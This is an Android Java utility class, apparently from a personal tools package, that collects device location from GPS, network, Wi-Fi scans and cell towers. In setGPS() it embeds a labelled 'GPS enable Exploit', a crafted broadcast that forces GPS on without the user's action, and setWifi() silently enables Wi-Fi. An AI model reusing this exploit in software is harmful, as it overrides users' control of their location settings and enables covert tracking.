/*
Copyright (C) 2013  Victor A. Torre (aka @ehooo) - web.ehooo[AT]gmail.com

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
package es.nom.ehooo.tools;

import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;


import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;

public class Locator{

	/**
	 * @param latitude
	 * @param longitude
	 * @return String with url in google maps
	 */
	public static final String getMapUrl(final double latitude, final double longitude){
		final StringBuffer sb = new StringBuffer();
		sb.append("https://maps.google.com/?q=");
		sb.append(latitude);
		sb.append(",");
		sb.append(longitude);
		return sb.toString();
	}

	/*
	private static final Criteria basicCriteria = new Criteria();
	static {
		basicCriteria.setAltitudeRequired(false);
		basicCriteria.setBearingRequired(false);
		basicCriteria.setCostAllowed(true);
		basicCriteria.setPowerRequirement(Criteria.NO_REQUIREMENT);
		basicCriteria.setSpeedRequired(false);
		basicCriteria.setAccuracy(Criteria.ACCURACY_FINE);
	}//*/
	static final int TIME_GAP = 10 * 1000;

	private final HashMap<String, Location> locations = new HashMap<String, Location>();
	private final ArrayList<ScanResult> wifis = new ArrayList<ScanResult>();
	private CellLocation celda = null;
	private Context context=null;
	public Locator(final Context context) {
		this.context = context;
	}

	/**
	 * Turn On set* using a thread for not lock the process
	 * @param provider The value to call<br>
	 * <i>Values por provider:</i><br>
	 * <b>cell</b> For setCell<br>
	 * <b>wifi</b> For setWifi<br>
	 * <b>network</b> For setNetwork<br>
	 * <b>gps</b> For getGPS<br>
	 * For others values will call 'setListener(<b>provider</b>)'<br>
	 */
	public void set(final String provider){
		if ("cell".equals(provider))
			setCell();
		else if ("wifi".equals(provider))
			setWifi();
		else if ("gps".equals(provider))
			setGPS();
		else if ("network".equals(provider))
			setNetwork();
		else
			setListener(provider);
	}

	@Override
	public String toString() {
		final StringBuffer sb = new StringBuffer();
		for (Location l : locations.values()){
			sb.append( "Provider:" );
			sb.append( l.getProvider() );
			sb.append( "\t" );
			sb.append( getMapUrl(l.getLatitude(), l.getLongitude()) );
			sb.append( "\n" );
		}

		for(ScanResult s : wifis){
			sb.append( "SSID:" );
			sb.append( s.SSID );
			sb.append( "\tBSSID:" );
			sb.append( s.BSSID );
			sb.append( "\tLevel:" );
			sb.append( s.level );
			sb.append( "dBm" );
			sb.append( "\n" );
		}

		if(celda instanceof GsmCellLocation){
			final GsmCellLocation gsm = (GsmCellLocation) celda;
			final int lac = gsm.getLac();
			final int cid = gsm.getCid();
			sb.append("GSM\n");
			if(lac!=-1){
				sb.append("Lac: ");
				sb.append( gsm.getLac() );
				sb.append("\n");
			}
			if(cid!=-1){
				sb.append("Cid: ");
				sb.append( gsm.getCid() );
				sb.append("\n");
			}
			if(Build.VERSION.SDK_INT > Build.VERSION_CODES.FROYO){
				try{
					//final Class<Object> empy = null;//Esto es para que no de un aviso por pasar null en getMethod() e invoke()
					final Method method = gsm.getClass().getMethod("getPsc");//, empy);
	                final int psc = (Integer) method.invoke(gsm);//, empy);
					sb.append("Psc: ");
					sb.append( psc );
					sb.append("\n");
				}catch (Exception e) {
					e.printStackTrace();
				}
			}
		}else if(celda instanceof CdmaCellLocation){
			final CdmaCellLocation cdma = (CdmaCellLocation) celda;
			final int baseid = cdma.getBaseStationId();
			final int netid = cdma.getNetworkId();
			final int sid = cdma.getSystemId();
			sb.append("CDMA\n");
			if(baseid!=-1){
				sb.append("BaseStationId:");
				sb.append( baseid );
				sb.append("\n");
			}
			if(netid!=-1){
				sb.append("NetworkId:");
				sb.append( netid );
				sb.append("\n");
			}
			if(sid!=-1){
				sb.append("SystemId:");
				sb.append( sid );
				sb.append("\n");
			}

			final int latitude = cdma.getBaseStationLatitude();
			final int longitude = cdma.getBaseStationLongitude();
			if(latitude != Integer.MAX_VALUE || longitude != Integer.MAX_VALUE){
				sb.append("BaseLoc:");
				sb.append( getMapUrl(latitude, longitude) );
				sb.append("\n");
			}
		}

		return sb.toString();
	}

	/**
	 * Using TELEPHONY_SERVICE
	 * Save cell information
	 */
	public final void setCell(){
		final TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
		celda = telephonyManager.getCellLocation();
	}

	/**
	 * Using WIFI_SERVICE
	 * Save list of Wi-Fi enables
	 */
	public void setWifi(){
		final WifiManager wifiManager = (WifiManager)context.getSystemService(Context.WIFI_SERVICE);
		if( wifiManager==null || (!wifiManager.isWifiEnabled() && !wifiManager.setWifiEnabled(true)) )
			return;
		if( wifiManager.startScan() ){
			wifis.clear();
			final List<ScanResult> res = wifiManager.getScanResults();
			if(res != null)
				for(ScanResult s : res)
					wifis.add(s);
		}
	}

	/**
	 * Using LOCATION_SERVICE
	 * This LocationListener save location information
	 */
    private final LocationListener locationListener = new LocationListener() {
		public void onStatusChanged(String provider, int status, Bundle extras) {}
		public void onProviderEnabled(String provider) {}
		public void onProviderDisabled(String provider) {}
		public void onLocationChanged(Location location) {
			if(locations.containsKey(location.getProvider())){
				final Location old_location = locations.get(location.getProvider());
				if(!old_location.hasAccuracy() ||
					old_location.getAccuracy() > location.getAccuracy() ||
					old_location.getTime()+TIME_GAP < location.getTime()
					){
					locations.put(location.getProvider(), location);
				}
			}else{
				locations.put(location.getProvider(), location);
			}
		}
	};
	/**
	 * Turn on the GPS provider
	 */
	public void setGPS(){
		final LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)){
			//GPS enable Exploit (http://code.google.com/p/android/issues/detail?id=7890)
			Intent intent=new Intent("android.location.GPS_ENABLED_CHANGE");
			intent.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
			intent.addCategory(Intent.CATEGORY_ALTERNATIVE);
			intent.setData(Uri.parse("3"));
			context.sendBroadcast(intent);

		}
		setListener(LocationManager.GPS_PROVIDER);
	}
	/**
	 * Turn on the Network provider
	 */
	public void setNetwork(){
		setListener(LocationManager.NETWORK_PROVIDER);
	}
	/**
	 * Set 'locationListener' as Listener for location provider
	 * @param provider Location provider name 
	 */
	public void setListener(final String provider){
		final LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		if (locationManager.isProviderEnabled(provider))
			locationManager.requestLocationUpdates(provider, 0, 0, locationListener);
	}
	/**
	 * Remove 'locationListener' from all Location providers
	 */
	public void cleanListeners() {
		final LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		locationManager.removeUpdates(locationListener);
	}

}
